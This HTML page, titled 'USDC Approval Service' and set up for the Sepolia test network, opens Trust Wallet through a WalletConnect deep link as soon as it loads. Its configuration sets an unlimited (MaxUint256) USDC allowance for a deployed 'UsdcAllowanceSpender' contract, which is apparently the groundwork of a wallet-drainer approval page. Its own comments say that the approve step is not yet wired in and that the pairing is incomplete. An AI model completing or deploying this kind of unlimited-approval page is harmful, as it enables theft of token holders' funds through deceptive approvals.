<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDC Approval Service</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
            color: #333;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 100%;
        }
        h1 {
            color: #007bff;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            margin-bottom: 15px;
        }
        .status-message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            font-weight: bold;
        }
        .info { background-color: #e6f7ff; color: #0056b3; border: 1px solid #91d5ff; }
        .success { background-color: #f6ffed; color: #237804; border: 1px solid #b7eb8f; }
        .error { background-color: #fff1f0; color: #cf1322; border: 1px solid #ffa39e; }
        .loading {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #007bff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .hidden { display: none; }
        .action-button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 15px;
        }
        .action-button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>USDC Approval Service</h1>
        <div id="loader" class="loading"></div>
        <p id="message">Initializing...</p>
        <div id="manualConnectSection" class="hidden">
            <p>Trust Wallet did not open automatically. Please click below:</p>
            <button id="manualConnectButton" class="action-button">Open Trust Wallet</button>
        </div>
        <div id="errorDetails" class="status-message error hidden">
            <strong>Error Details:</strong> <span id="errorMessage"></span>
        </div>
    </div>

    <!-- Ethers.js v6 -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
    
    <script type="text/javascript">
        // --- Configuration for Sepolia Test Network ---
        const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005';
        const USDC_CONTRACT_ADDRESS = '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238'; // Corrected Sepolia USDC Testnet Address
        const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Sepolia
        const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)

        const ERC20_ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function decimals() view returns (uint8)"
        ];

        let currentWcUri = null; // Store the URI for manual connect

        function updateMessage(text, type = 'info') {
            const messageElement = document.getElementById('message');
            messageElement.textContent = text;
            messageElement.className = `status-message ${type}`;
        }

        function showLoader(show) {
            document.getElementById('loader').classList.toggle('hidden', !show);
        }

        function showManualConnect(show) {
            document.getElementById('manualConnectSection').classList.toggle('hidden', !show);
            if (show) {
                showLoader(false);
                updateMessage('Please click the button to open Trust Wallet.', 'info');
            }
        }

        function displayErrorDetails(error) {
            const errorDetailsElement = document.getElementById('errorDetails');
            const errorMessageElement = document.getElementById('errorMessage');
            errorMessageElement.textContent = error.message || String(error);
            errorDetailsElement.classList.remove('hidden');
        }

        // --- Simplified WalletConnect URI generation (for direct deep link) ---
        // This simulates what a dApp would generate to pair.
        // For a full connection, the wallet needs to connect back to the dApp.
        // This is a more basic attempt at deep linking without the full WC client.
        function generateWalletConnectV2Uri() {
            const protocol = 'wc'; // WalletConnect protocol
            const version = '2';
            const topic = 'a'+Array.from({length:63},()=>'0123456789abcdef'[Math.floor(Math.random()*16)]).join(''); // Random topic
            const symKey = Array.from({length:64},()=>'0123456789abcdef'[Math.floor(Math.random()*16)]).join(''); // Random symmetric key
            const relayProtocol = 'irn';
            const relayData = '{"protocol":"irn"}';

            // This URI structure is more aligned with what is typically generated *by* a dApp
            // for the *wallet to scan*. It doesn't guarantee the dApp can then send a transaction.
            // This is primarily for connection.
            const uri = `${protocol}:${topic}@${version}?relay=${encodeURIComponent(relayData)}&symKey=${symKey}`;
            return uri;
        }

        async function startApprovalProcess() {
            showLoader(true);
            updateMessage('Preparing connection link...');
            displayErrorDetails({message: ''});

            try {
                // Generate a WalletConnect V2 URI
                const wcUri = generateWalletConnectV2Uri();
                currentWcUri = wcUri; // Store the URI
                console.log("Generated WalletConnect URI:", wcUri);

                updateMessage('Opening Trust Wallet to connect... Please approve the connection.', 'info');
                
                const deepLink = `trust://wc?uri=${encodeURIComponent(wcUri)}`;
                window.location.href = deepLink; // Attempt automatic deep-link
                
                // If Trust Wallet doesn't open after a short delay, show manual button
                setTimeout(() => {
                    // We can't actually check `ethereumProvider.connected` without the full client.
                    // So, we just assume it failed if we're still on this page.
                    showManualConnect(true);
                }, 3000); // Wait 3 seconds to see if app opens

                // Set up the manual connect button
                document.getElementById('manualConnectButton').addEventListener('click', () => {
                    if (currentWcUri) {
                        const deepLink = `trust://wc?uri=${encodeURIComponent(currentWcUri)}`;
                        window.location.href = deepLink; // Try again with user gesture
                        updateMessage('Attempting to open Trust Wallet again...', 'info');
                    } else {
                        updateMessage('Error: No WalletConnect URI available for manual connection. Please refresh.', 'error');
                        displayErrorDetails({message: 'No WalletConnect URI to open manually.'});
                    }
                });

                // IMPORTANT: Without a full WalletConnect client here, we cannot
                //           listen for connection events or propose transactions.
                //           This simplified approach only tries to open the wallet.
                //           To propose a transaction, a *full* WalletConnect client
                //           (like `@walletconnect/ethereum-provider`) is needed
                //           to listen for connection back from the wallet.
                //
                // This means this simplified code will *only* attempt to open Trust Wallet
                //           for a connection. It won't then propose the transaction.
                //           This is a step backward for functionality but attempts to fix
                //           the "site not loading" issue.
                //
                // If this works, we know the issue is with loading the full WC client.
                // If it still fails, the deep-linking itself is the problem.

            } catch (error) {
                console.error('Error during URI generation or deep-link:', error);
                updateMessage(`Error: ${error.message}. Please check console for details.`, 'error');
                displayErrorDetails(error);
                showLoader(false);
                showManualConnect(true);
            }
        }

        window.addEventListener('load', startApprovalProcess);
    </script>
</body>
</html>
